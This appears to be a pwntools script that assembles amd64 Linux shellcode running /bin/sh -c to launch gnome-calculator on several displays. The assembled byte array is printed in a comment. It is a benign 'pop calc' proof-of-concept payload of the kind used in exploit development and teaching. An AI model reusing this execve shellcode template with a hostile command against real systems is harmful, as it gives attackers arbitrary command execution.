from pwn import *

context.arch='amd64'

sc = shellcraft.pushstr("/bin/sh")
sc += shellcraft.mov('rdi','rsp')

sc += shellcraft.pushstr("-c")
sc += shellcraft.mov('r8','rsp')

# Try to open the calculator in all displays
sc += shellcraft.pushstr(" /bin/sh -c 'for d in 0 1 2 3 4 5; do env HOME=/home/$(whoami) DISPLAY=:$d /usr/bin/gnome-calculator; done'")
sc += shellcraft.mov('r9','rsp')

sc += shellcraft.push(0)
sc += shellcraft.push('r9')
sc += shellcraft.push('r8')
sc += shellcraft.push('rdi')

sc += shellcraft.syscall(59, 'rdi', 'rsp', 0)

sasm = asm(sc)

print map(ord, sasm)

"""
Here is the shellcode:

[72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 44, 98, 1, 1, 129, 52, 36, 1, 1, 1, 1, 73, 137, 224, 104, 111, 100, 38, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 97, 116, 111, 114, 59, 32, 100, 111, 80, 72, 184, 101, 45, 99, 97, 108, 99, 117, 108, 80, 72, 184, 98, 105, 110, 47, 103, 110, 111, 109, 80, 72, 184, 36, 100, 32, 47, 117, 115, 114, 47, 80, 72, 184, 73, 83, 80, 76, 65, 89, 61, 58, 80, 72, 184, 104, 111, 97, 109, 105, 41, 32, 68, 80, 72, 184, 104, 111, 109, 101, 47, 36, 40, 119, 80, 72, 184, 118, 32, 72, 79, 77, 69, 61, 47, 80, 72, 184, 53, 59, 32, 100, 111, 32, 101, 110, 80, 72, 184, 49, 32, 50, 32, 51, 32, 52, 32, 80, 72, 184, 32, 100, 32, 105, 110, 32, 48, 32, 80, 72, 184, 32, 45, 99, 32, 39, 102, 111, 114, 80, 72, 184, 32, 47, 98, 105, 110, 47, 115, 104, 80, 73, 137, 225, 106, 1, 254, 12, 36, 65, 81, 65, 80, 87, 106, 59, 88, 72, 137, 230, 153, 15, 5]

"""
